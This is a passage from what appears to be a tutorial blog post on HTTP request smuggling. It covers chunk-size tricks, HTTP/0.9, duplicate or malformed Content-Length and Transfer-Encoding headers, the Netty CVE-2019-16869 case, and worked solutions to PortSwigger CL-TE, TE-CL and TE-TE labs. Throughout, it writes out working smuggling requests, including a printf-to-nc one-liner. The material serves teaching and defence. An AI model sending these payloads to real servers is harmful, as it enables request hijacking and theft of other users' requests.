</span></code></pre></div><p>The front server will think that <code>Dummy: Header\rZTransfer-Encoding: chunked\r\n</code> is a header. When use CL header parsing, it will consider this a complete request, and Node.js will consider<code> \rZ</code> as a Newline, according to the parsing rule that TE takes precedence over CL, it is considered that these are two requests, resulting in parsing differences.</p>
<h3 id=size-issue>Size Issue</h3>
<p>You can also use some coded block lengths to generate parsing differences</p>
<p>Such as:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>printf</span> <span class=s1>&#39;GET / HTTP/1.1\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Host:localhost\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Transfer-Encoding: chunked\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Dummy:Header\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;0000000000000000000000000000042\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;GET /tmp/ HTTP/1.1\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Host:localhost\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Transfer-Encoding: chunked\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;0\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=p>|</span> nc -q3 127.0.0.1 <span class=m>8080</span>
</code></pre></div><p>Some middleware will truncate the chunk length data when parsing the chunk size data. For example, here it is shown as only taking <code>0000000000000000000000000000042</code> as<code> 00000000000000000</code>, so it will be considered that these are two requests. The first request&rsquo;s chunk size is 0. The second will request <code>/tmp</code>, which results in HTTP Smuggling.</p>
<h3 id=http-version>HTTP Version</h3>
<p>This is mainly due to the problem caused by HTTP/0.9. Let&rsquo;s take a look at several examples of HTTP:</p>
<p>HTTP v1.1</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=err>GET /foo HTTP/1.1\r\n
</span><span class=err>Host: example.com\r\n
</span></code></pre></div><p>HTTP v1.0</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=err>GET /foo HTTP/1.0\r\n
</span><span class=err>\r\n
</span></code></pre></div><p>HTTP v0.9</p>
<pre tabindex=0><code>GET /foo\r\n
</code></pre><p>And HTTP/0.9 request and response packets do not have headers. Such as:</p>
<p><figure class=gallery-image style=flex-grow:151;flex-basis:363px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520134497.png data-size=1832x1211><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520134497.png width=1832 height=1211 srcset="/2019/12/08/HTTP-Smuggling-en/20200520134497_hu3b252fe33c04093db1d24da66617f96f_235581_480x0_resize_box_3.png 480w, /2019/12/08/HTTP-Smuggling-en/20200520134497_hu3b252fe33c04093db1d24da66617f96f_235581_1024x0_resize_box_3.png 1024w" loading=lazy>
</a>
</figure></p>
<p>Because HTTP/0.9 response packets do not have headers, they are particularly interesting to be used in HTTP Smuggling.</p>
<p><figure class=gallery-image style=flex-grow:138;flex-basis:331px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520136500.png data-size=1813x1313><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520136500.png width=1813 height=1313 srcset="/2019/12/08/HTTP-Smuggling-en/20200520136500_hu0d851efc7bfc2f3d462ebdb0c26e2ed5_374595_480x0_resize_box_3.png 480w, /2019/12/08/HTTP-Smuggling-en/20200520136500_hu0d851efc7bfc2f3d462ebdb0c26e2ed5_374595_1024x0_resize_box_3.png 1024w" loading=lazy>
</a>
</figure></p>
<p>The meaning of this picture is that we use HTTP/0.9 for Smuggle when HTTP Smuggling. This is not the HTTP/0.9 standard format, but because some middleware no longer supports the standard format of directly parsing HTTP/0.9, but it is still possible to parse specified HTTP version. Then the following situations may exist:</p>
<p><figure class=gallery-image style=flex-grow:146;flex-basis:350px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520134449.png data-size=1785x1222><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520134449.png width=1785 height=1222 srcset="/2019/12/08/HTTP-Smuggling-en/20200520134449_huc1a1067a40e0522509ca788e028740b2_238319_480x0_resize_box_3.png 480w, /2019/12/08/HTTP-Smuggling-en/20200520134449_huc1a1067a40e0522509ca788e028740b2_238319_1024x0_resize_box_3.png 1024w" loading=lazy>
</a>
</figure></p>
<p><figure class=gallery-image style=flex-grow:140;flex-basis:337px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520139919.png data-size=1762x1253><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520139919.png width=1762 height=1253 srcset="/2019/12/08/HTTP-Smuggling-en/20200520139919_hu81fc8321e62bfa0f5bf6b0369d8b8d81_278838_480x0_resize_box_3.png 480w, /2019/12/08/HTTP-Smuggling-en/20200520139919_hu81fc8321e62bfa0f5bf6b0369d8b8d81_278838_1024x0_resize_box_3.png 1024w" loading=lazy>
</a>
</figure></p>
<p>The above two figures show a rough attack flow. The 24-33664 bytes in chewy2.jpg have a complete HTTP response message. When Golang is processing HTTP/0.9, since we specified <code>Range: bytes=24-33664</code>, we can specify to obtain 24-33664 bytes of the response message, which is to obtain the HTTP message we stored in the picture, and then return it to Golang. Golang standardizes HTTP/0.9 and then remove headers. So the response looks like a new response.</p>
<p><figure class=gallery-image style=flex-grow:133;flex-basis:319px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520131041.png data-size=1594x1197><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520131041.png width=1594 height=1197 srcset="/2019/12/08/HTTP-Smuggling-en/20200520131041_hu21a474fe0b9136fcb730fae9f1a910eb_239990_480x0_resize_box_3.png 480w, /2019/12/08/HTTP-Smuggling-en/20200520131041_hu21a474fe0b9136fcb730fae9f1a910eb_239990_1024x0_resize_box_3.png 1024w" loading=lazy>
</a>
</figure></p>
<p>When a normal user requests, if Apache reuses the TCP / IP link, it will return the HTTP message we constructed in the picture as a response packet to the user. This is also a very typical idea of HTTP Response Splitting. For details, please see the video demo <a class=link href="https://www.youtube.com/watch?v=lY_Mf2Fv7kI" target=_blank rel=noopener>HTTP Smuggling Examples 2016</a></p>
<h3 id=has-a-cl-in-get>Has a CL in GET</h3>
<p>In this scenario, the body is used in the GET request, and the length of the body is indicated by Content-Length.</p>
<blockquote>
<p>GET request is not the only one that get affected. I just use it as an example because it is typical. All HTTP requests that do not carry the request body may be affected by this.</p>
</blockquote>
<p>According to <a class=link href=https://tools.ietf.org/html/rfc7230##section-3.3.2 target=_blank rel=noopener>RFC7230 Content-Length</a>:</p>
<blockquote>
<p>For example, a Content-Length header field is normally sent in a POST request even when the value is 0 (indicating an empty payload body). A user agent SHOULD NOT send a Content-Length header field when the request message does not contain a payload body and the method semantics do not anticipate such a body.</p>
</blockquote>
<p>In the newest <a class=link href=https://tools.ietf.org/html/rfc7231##section-4.3.1 target=_blank rel=noopener>RFC7231 4.3.1 GET</a> also just mention a sentence：</p>
<blockquote>
<p>A payload within a GET request message has no defined semantics; sending a payload body on a GET request might cause some existing implementations to reject the request.</p>
</blockquote>
<p>For requests that have a body field and indicate the length of the body with Content-Length, the RFC does not strictly explain how the server should handle it, so most middleware also loosely handles GET requests with a body, but this is also part of the situation Because these middlewares do not have a strict standard basis, parsing differences can also cause HTTP Smuggling attacks.</p>
<p>Here we give a simple and idealized example. The Front server allows body for GET requests, while the Backend server ignores GET requests with body.</p>
<p>When we send following requests：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=err>GET / HTTP/1.1\r\n
</span><span class=err>Host: example.com\r\n
</span><span class=err>Content-Length: 41\r\n
</span><span class=err>\r\n
</span><span class=err>GET /secret HTTP/1.1\r\n
</span><span class=err>Host: example.com\r\n
</span><span class=err>\r\n
</span></code></pre></div><p>When the Front server processes this request, it will forward the above request to the Backend server as a complete request, and the Backend service will treat this request as two requests when processing this server.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=err>GET / HTTP/1.1\r\n
</span><span class=err>Host: example.com\r\n
</span><span class=err>Content-Length: 41\r\n
</span><span class=err>\r\n
</span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=err>GET /secret HTTP/1.1\r\n
</span><span class=err>Host: example.com\r\n
</span><span class=err>\r\n
</span></code></pre></div><p>In this way, we can successfully perform HTTP Smuggling. From this example, it is not difficult to see that if there is a HTTP Smuggling vulnerability in the scene, then the Content-Length data becomes extra important because it affects us. Whether the attack was successful and whether our HTTP request was successfully embedded in an HTTP request.</p>
<p>The calculation method here is similar to the previous.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=err>GET /secret HTTP/1.1\r\n					--&gt;		&#34;GET /secret HTTP/1.1&#34; 20 characters in total, plus 22 characters in CRLF
</span><span class=err>Host: example.com\r\n									--&gt;		&#34;Host: example.com&#34; 17 characters in total, plus 19 characters in CRLF
</span></code></pre></div><p>22 + 19 = 41 Bytes.</p>
<h3 id=two-identical-fields---cl>Two Identical Fields - CL</h3>
<p>Here we take Content-Length as an example. According to <a class=link href=https://tools.ietf.org/html/rfc7230##section-3.3.2 target=_blank rel=noopener>RFC7230 section 3.3.2</a>:</p>
<blockquote>
<p>If a message is received that has multiple Content-Length header fields with field-values consisting of the same decimal value, or a single Content-Length header field with a field value containing a list of identical decimal values (e.g., &ldquo;Content-Length: 42, 42&rdquo;), indicating that duplicate Content-Length header fields have been generated or combined by an upstream message processor, then the recipient MUST either reject the message as invalid or replace the duplicated field-values with a single valid Content-Length field containing that decimal value prior to determining the message body length or forwarding the message.</p>
</blockquote>
<p>And in the <a class=link href=https://tools.ietf.org/html/rfc7230##section-3.3.3 target=_blank rel=noopener>RFC 7230 section 3.3.3</a> also mention this:</p>
<blockquote>
<p>If a message is received without Transfer-Encoding and with either multiple Content-Length header fields having differing field-values or a single Content-Length header field having an invalid value, then the message framing is invalid and the recipient MUST treat it as an unrecoverable error. If this is a request message, the server MUST respond with a 400 (Bad Request) status code and then close the connection.</p>
</blockquote>
<p>The RFC also has a relatively clear specification for this situation, but let&rsquo;s assume here a relatively simple example. We send the following request:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=err>GET /suzann.html HTTP/1.1\r\n
</span><span class=err>Host: example.com\r\n
</span><span class=err>Content-Length: 0\r\n
</span><span class=err>Content-Length: 46\r\n
</span><span class=err>\r\n
</span><span class=err>GET /walter.html HTTP/1.1\r\n
</span><span class=err>Host: example.com\r\n
</span><span class=err>\r\n
</span></code></pre></div><p>Here, we assume that the Front server uses the second Content-Length as the parsing standard, discarding the first Content-Length field or doing nothing to the first or anything else, assuming it only processes the second Content-Length field; we are assuming that the Backend server uses the first Content-Length field as the parsing standard, and ignore the second.</p>
<p>This is equivalent to injecting another HTTP request into the HTTP request. If the entire scenario looks like ours, there is an HTTP Smuggling attack.</p>
<p>For example, if the server uses the first Content-Length as the parsing standard, two HTTP requests will appear in the parsing. If the second is used as the parsing standard, it will be considered that there is only one HTTP request.</p>
<h3 id=optional-whitespace>Optional WhiteSpace</h3>
<p>RFC7320 describes the header field like this:</p>
<blockquote>
<p>3.2. Header Fields</p>
<p>Each header field consists of a case-insensitive field name followed
by a colon (":"), optional leading whitespace, the field value, and
optional trailing whitespace.</p>
<pre tabindex=0><code>     header-field   = field-name &quot;:&quot; OWS field-value OWS

     field-name     = token
     field-value    = *( field-content / obs-fold )
     field-content  = field-vchar [ 1*( SP / HTAB ) field-vchar ]
     field-vchar    = VCHAR / obs-text

     obs-fold       = CRLF 1*( SP / HTAB )
                    ; obsolete line folding
                    ; see Section 3.2.4
</code></pre><p>The field-name token labels the corresponding field-value as having
the semantics defined by that header field. For example, the Date
header field is defined in Section 7.1.1.2 of [RFC7231] as containing
the origination timestamp for the message in which it appears.</p>
</blockquote>
<p>In particular, the first sentence indicates that the field should be immediately followed by <code>:</code> colon, then OWS (Optional WhiteSpace) optional space, then field value, and finally OWS optional space.</p>
<p>What&rsquo;s wrong with this? Obviously, if there is middleware that does not strictly follow the RFC standard for this implementation, HTTP Smuggling attacks will also occur.</p>
<p>A typical example is CVE-2019-16869. This CVE was discovered by OPPO Meridian Internet Security Lab. It is about HTTP Smuggling vulnerability in Netty middleware.</p>
<p>Prior to Netty 4.1.42.Final, the processing of Header headers was using [splitHeader](<a class=link href=https://github.com/netty/netty/blob/netty-4.1.41.Final/codec-http/src/main/ target=_blank rel=noopener>https://github.com/netty/netty/blob/netty-4.1.41.Final/codec-http/src/main/</a> java / io / netty / handler / codec / http / HttpObjectDecoder.java) method, where the key code is as follows:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=k>for</span> <span class=o>(</span><span class=n>nameEnd</span> <span class=o>=</span> <span class=n>nameStart</span><span class=o>;</span> <span class=n>nameEnd</span> <span class=o>&lt;</span> <span class=n>length</span><span class=o>;</span> <span class=n>nameEnd</span> <span class=o>++)</span> <span class=o>{</span>
  <span class=kt>char</span> <span class=n>ch</span> <span class=o>=</span> <span class=n>sb</span><span class=o>.</span><span class=na>charAt</span><span class=o>(</span><span class=n>nameEnd</span><span class=o>);</span>
  <span class=k>if</span> <span class=o>(</span><span class=n>ch</span> <span class=o>==</span> <span class=sc>&#39;:&#39;</span> <span class=o>||</span> <span class=n>Character</span><span class=o>.</span><span class=na>isWhitespace</span><span class=o>(</span><span class=n>ch</span><span class=o>))</span> <span class=o>{</span>
    <span class=k>break</span><span class=o>;</span>
  <span class=o>}</span>
<span class=o>}</span>
</code></pre></div><p>We don&rsquo;t need to know much about other codes. Here we can know that white space is treated the same as <code>:</code> colon, that is, if there is a space, the field name before <code>:</code> will be processed normally and will not be thrown error or other operations. This is inconsistent with the specifications of the RFC standard, and parsing differences will occur.</p>
<p>@ Bi3g0 built a clearer schematic of the vulnerability:</p>
<p><figure>
<a href=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@masterhttps://user-images.githubusercontent.com/18691823/65211134-3e03cd00-dad0-11e9-94a5-b9f04ea18f38.png><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@masterhttps://user-images.githubusercontent.com/18691823/65211134-3e03cd00-dad0-11e9-94a5-b9f04ea18f38.png loading=lazy>
</a>
</figure></p>
<p>The example used here is to use ELB as the front server and Netty as the backend server. We send the following request:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=nf>POST</span> <span class=nn>/getusers</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Host</span><span class=o>:</span> <span class=l>www.backend.com</span>
<span class=n>Content-Length</span><span class=o>:</span> <span class=l>64</span>
<span class=n>Transfer-Encoding</span> <span class=o>:</span> <span class=l>chunked</span>

<span class=g>0
</span><span class=g>
</span><span class=g>GET /hacker HTTP/1.1
</span><span class=g>Host: www.hacker.com
</span><span class=g>hacker: hacker
</span></code></pre></div><p>ELB will ignore the Transfer-Encoding field, because there is a space between the colon and the colon. It does not comply with the RFC standard. It will use Content-Length as the parsing standard, so it will consider the above request as a complete request, and then throw it to the Backend server Netty. Netty will parse Transfer-Encoding first. Even if this field does not comply with the RFC standard, but because its implementation is not strict, it will split this request into two because it parses Transfer-Encoding first.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=nf>POST</span> <span class=nn>/getusers</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Host</span><span class=o>:</span> <span class=l>www.backend.com</span>
<span class=n>Content-Length</span><span class=o>:</span> <span class=l>64</span>
<span class=n>Transfer-Encoding</span> <span class=o>:</span> <span class=l>chunked</span>

<span class=g>0
</span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=nf>GET</span> <span class=nn>/hacker</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Host</span><span class=o>:</span> <span class=l>www.hacker.com</span>
<span class=n>hacker</span><span class=o>:</span> <span class=l>hacker</span>
</code></pre></div><p>This result in HTTP smuggling.</p>
<p>Netty fixed this vulnerability in 4.1.42 Final: <a class=link href=https://github.com/netty/netty/pull/9585 target=_blank rel=noopener>Correctly handle whitespaces in HTTP header names as defined by RFC72 &mldr;</a></p>
<p>When we send a header request with a space between field name and colon, netty returns 400 correctly.</p>
<h3 id=cl-te>CL-TE</h3>
<p>In the next few attack methods, we can use some Labs provided by @portswigger to practice for us to deepen our understanding. <a class=link href=https://portswigger.net/web-security/request-smuggling target=_blank rel=noopener>Labs-HTTP request smuggling</a></p>
<p>Remember to cancel BurpSuite&rsquo;s automatic update Content-Length function before doing it.</p>
<p><figure class=gallery-image style=flex-grow:158;flex-basis:381px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520135762.jpg data-size=2560x1612><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520135762.jpg width=2560 height=1612 srcset="/2019/12/08/HTTP-Smuggling-en/20200520135762_hu99a744ea0805facb74e8940a81aa0415_343035_480x0_resize_q75_box.jpg 480w, /2019/12/08/HTTP-Smuggling-en/20200520135762_hu99a744ea0805facb74e8940a81aa0415_343035_1024x0_resize_q75_box.jpg 1024w" loading=lazy>
</a>
</figure></p>
<p>First let&rsquo;s look at the situation of CL-TE: <a class=link href=https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te target=_blank rel=noopener>Lab: HTTP request smuggling, basic CL.TE vulnerability</a></p>
<blockquote>
<p>This lab involves a front-end and back-end server, and the front-end server doesn&rsquo;t support chunked encoding. The front-end server rejects requests that aren&rsquo;t using the GET or POST method.</p>
<p>To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.</p>
</blockquote>
<p>According to the chall, we only need to let the Backend server receive the GPOST method, and the scenario clearly tells us that it is a CL-TE scenario.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Host</span><span class=o>:</span> <span class=l>ac8f1fae1e6cd77b8073213100b500d6.web-security-academy.net</span>
<span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
<span class=n>Content-Length</span><span class=o>:</span> <span class=l>6</span>
<span class=n>Transfer-Encoding</span><span class=o>:</span> <span class=l>chunked</span>

0

G
</code></pre></div><p>We can send above requests twice.</p>
<p><figure class=gallery-image style=flex-grow:158;flex-basis:381px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520137370.jpg data-size=2560x1612><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520137370.jpg width=2560 height=1612 srcset="/2019/12/08/HTTP-Smuggling-en/20200520137370_hu99a744ea0805facb74e8940a81aa0415_570314_480x0_resize_q75_box.jpg 480w, /2019/12/08/HTTP-Smuggling-en/20200520137370_hu99a744ea0805facb74e8940a81aa0415_570314_1024x0_resize_q75_box.jpg 1024w" loading=lazy>
</a>
</figure></p>
<p><figure class=gallery-image style=flex-grow:158;flex-basis:381px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520138381.jpg data-size=2560x1612><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520138381.jpg width=2560 height=1612 srcset="/2019/12/08/HTTP-Smuggling-en/20200520138381_hu99a744ea0805facb74e8940a81aa0415_309108_480x0_resize_q75_box.jpg 480w, /2019/12/08/HTTP-Smuggling-en/20200520138381_hu99a744ea0805facb74e8940a81aa0415_309108_1024x0_resize_q75_box.jpg 1024w" loading=lazy>
</a>
</figure></p>
<p>We can make the second method to construct the HTTP method of GPOST. For details, we can follow this flowchart to see:</p>
<pre tabindex=0><code>                      User            Front           Backend
                      |               |               |
                      |--A(1A+1/2B)--&gt;|               | 
                      |               |--A(1A+1/2B)--&gt;| 
                      |               |&lt;-A(200)-------|
                      |               |            [1/2B]
                      |&lt;-A(200)-------|            [1/2B]
                      |--C-----------&gt;|            [1/2B]
                      |               |--C-----------&gt;| * ending B *
                      |               |&lt;--B(200)------|
                      |&lt;--B(200)------|               |
</code></pre><ul>
<li>1A + 1/2B means request A + an incomplete query B</li>
<li>A(X) : means X query is hidden in body of query A</li>
<li>ending B: the 1st line of query C ends the incomplete header of query B. all others headers are added to the query. C disappears and mix C HTTP credentials with all previous B headers (cookie/bearer token/Host, etc.)</li>
</ul>
<p>The whole process is that when we send the above request and the Front server preferentially processes with CL, it will think the following data which is 6 bytes is the body of request A.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=err>0\r\n
</span><span class=err>\r\n
</span><span class=err>G
</span></code></pre></div><p>This request A will be forwarded to the backend as a complete request, and when the backend server preferentially processes it with TE, it will consider follwing data is a complete request.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Host</span><span class=o>:</span> <span class=l>ac8f1fae1e6cd77b8073213100b500d6.web-security-academy.net</span>
<span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
<span class=n>Content-Length</span><span class=o>:</span> <span class=l>6</span>
<span class=n>Transfer-Encoding</span><span class=o>:</span> <span class=l>chunked</span>

0
</code></pre></div><p>But the alone letter &lsquo;G&rsquo;, it will be considered as an incomplete request. So a 1/2 B request will be generated, so it will wait for the arrival of other data at the Backend server buffer to make the 1/2 B spliced into a complete request. When we send the second request, POST will be concatenated behind G, so the HTTP Method will become the GPOST method, which is the echo that we see, the unrecognized HTTP Method GPOST.</p>
<h3 id=te-cl>TE-CL</h3>
<p>Next we look at the situation of TE-CL. Similarly, we use LAB experiments to deepen our understanding.：<a class=link href=https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl target=_blank rel=noopener>Lab: HTTP request smuggling, basic TE.CL vulnerability</a></p>
<blockquote>
<p>This lab involves a front-end and back-end server, and the back-end server doesn&rsquo;t support chunked encoding. The front-end server rejects requests that aren&rsquo;t using the GET or POST method.</p>
<p>To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.</p>
</blockquote>
<p>According to the chall, what we want to achieve is still to let the backend receive the GPOST request, and the scenario clearly tells us that it is a TE-CL scenario.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Host</span><span class=o>:</span> <span class=l>acde1ffc1f047f9f8007186200ff00fe.web-security-academy.net</span>
<span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
<span class=n>Content-length</span><span class=o>:</span> <span class=l>4</span>
<span class=n>Transfer-Encoding</span><span class=o>:</span> <span class=l>chunked</span>

12
GPOST / HTTP/1.1
0


</code></pre></div><p>It should be noted here that at the end you need to add two CRLFs to construct chunk data.</p>
<pre tabindex=0><code>0\r\n
\r\n
</code></pre><p>Here we can send more than two HTTP request packets, and we can receive the response as shown below.</p>
<p><figure class=gallery-image style=flex-grow:287;flex-basis:689px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520139652.png data-size=1912x666><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520139652.png width=1912 height=666 srcset="/2019/12/08/HTTP-Smuggling-en/20200520139652_hu17eb6e3730c5246fad7ba01d5aab91c9_158643_480x0_resize_box_3.png 480w, /2019/12/08/HTTP-Smuggling-en/20200520139652_hu17eb6e3730c5246fad7ba01d5aab91c9_158643_1024x0_resize_box_3.png 1024w" loading=lazy>
</a>
</figure></p>
<p>The process flow is similar to CL-TE. When the Front server processes this request, it will be processed first according to TE. It will consider the above request as a whole and then forward it to the Backend server. When the Backend server processes it according to CL, it will consider that <code> 12\r\n</code> is the body of the first request, the following is the second request, so it will respond to GPOST as an unrecognized HTTP Method.</p>
<h3 id=two-identical-fields---te>Two Identical Fields - TE</h3>
<p>Here we look at the situation where TE exists. Similarly, we use LAB experiments to deepen our understanding:<a class=link href=https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header target=_blank rel=noopener>Lab: HTTP request smuggling, obfuscating the TE header</a></p>
<blockquote>
<p>This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren&rsquo;t using the GET or POST method.</p>
<p>To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.</p>
</blockquote>
<p>According to the chall, what we want to achieve is still to let the backend receive the GPOST request, and the scenario clearly tells us that it is a TE-TE scenario. In fact, this scenario can also be considered as the processing of the same field. For example, when processing two TE fields, if the second TE field is taken as the parsing standard, and the second field value is abnormal or the parsing error, it may be ignored. TE field, and CL field for parsing. For example, in this LAB, we send the following request twice.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Host</span><span class=o>:</span> <span class=l>acfd1f201f5fb528809b582e004200a3.web-security-academy.net</span>
<span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span>
<span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
<span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
<span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
<span class=n>Cookie</span><span class=o>:</span> <span class=l>session=9swxitdhJRXeFhq77wGSU7fKw0VTiuzQ</span>
<span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
<span class=n>Content-length</span><span class=o>:</span> <span class=l>4</span>
<span class=n>Transfer-Encoding</span><span class=o>:</span> <span class=l>chunked</span>
<span class=n>Transfer-encoding</span><span class=o>:</span> <span class=l>nothing</span>

<span class=g>12
</span><span class=g>GPOST / HTTP/1.1
</span><span class=g>
</span><span class=g>0
</span><span class=g>
</span><span class=g>
</span></code></pre></div><p>Here is the same as the previous scenario, you need to add two CRLF at the end.</p>
<pre tabindex=0><code>0\r\n
\r\n
</code></pre><p>We can get the response as shown below.</p>
<p><figure class=gallery-image style=flex-grow:396;flex-basis:951px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520132864.png data-size=1872x472><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520132864.png width=1872 height=472 srcset="/2019/12/08/HTTP-Smuggling-en/20200520132864_hub2c3924287ae78ebafe68510e79d0c4a_131995_480x0_resize_box_3.png 480w, /2019/12/08/HTTP-Smuggling-en/20200520132864_hub2c3924287ae78ebafe68510e79d0c4a_131995_1024x0_resize_box_3.png 1024w" loading=lazy>
</a>
</figure></p>
<p>We can see that two TE fields are used here, and the value of the second TE field is non-standard. Here, Front chooses to process the first TE first. The entire request is a normal request and will be forwarded to the Backend server. The backend server prioritizes the second TE. If the second TE value is abnormal, the CL field will be used for processing. This request will be split into two requests due to the CL field value 4.</p>
<p>The first request:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Host</span><span class=o>:</span> <span class=l>acfd1f201f5fb528809b582e004200a3.web-security-academy.net</span>
<span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span>
<span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
<span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
<span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
<span class=n>Cookie</span><span class=o>:</span> <span class=l>session=9swxitdhJRXeFhq77wGSU7fKw0VTiuzQ</span>
<span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
<span class=n>Content-length</span><span class=o>:</span> <span class=l>4</span>
<span class=n>Transfer-Encoding</span><span class=o>:</span> <span class=l>chunked</span>
<span class=n>Transfer-encoding</span><span class=o>:</span> <span class=l>nothing</span>

<span class=g>12
